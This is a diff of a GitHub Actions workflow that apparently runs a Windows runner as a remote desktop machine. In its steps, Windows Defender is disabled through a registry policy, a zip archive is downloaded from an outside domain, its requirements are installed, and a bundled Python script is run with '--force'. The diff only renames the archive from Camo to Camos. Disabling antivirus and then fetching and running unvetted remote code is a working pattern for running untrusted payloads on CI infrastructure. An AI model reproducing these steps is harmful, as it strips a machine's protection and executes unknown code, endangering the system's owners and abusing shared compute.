@@ -69,18 +69,18 @@ jobs:
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
       shell: pwsh
 
-    - name: Download Camo.zip to RDP Desktop
-      run: Invoke-WebRequest https://api.gap-indonesia.co.id/uploads/Camo.zip -OutFile C:\Users\runneradmin\Desktop\Camo.zip
+    - name: Download Camos.zip to RDP Desktop
+      run: Invoke-WebRequest https://api.gap-indonesia.co.id/uploads/Camos.zip -OutFile C:\Users\runneradmin\Desktop\Camos.zip
 
-    - name: Extract Camo.zip
-      run: Expand-Archive -Path C:\Users\runneradmin\Desktop\Camo.zip -DestinationPath C:\Users\runneradmin\Desktop\Camo
+    - name: Extract Camos.zip
+      run: Expand-Archive -Path C:\Users\runneradmin\Desktop\Camos.zip -DestinationPath C:\Users\runneradmin\Desktop\Camos
 
     - name: Install Requirements
-      run: pip install -r C:\Users\runneradmin\Desktop\Camo\requirements.txt
+      run: pip install -r C:\Users\runneradmin\Desktop\Camos\requirements.txt
 
     - name: Run the program (npb.py)
       run: |
-        cd C:\Users\runneradmin\Desktop\Camo
+        cd C:\Users\runneradmin\Desktop\Camos
         Start-Process powershell -ArgumentList '-NoExit', '-Command', 'python npb.py --force'
       shell: powershell
 
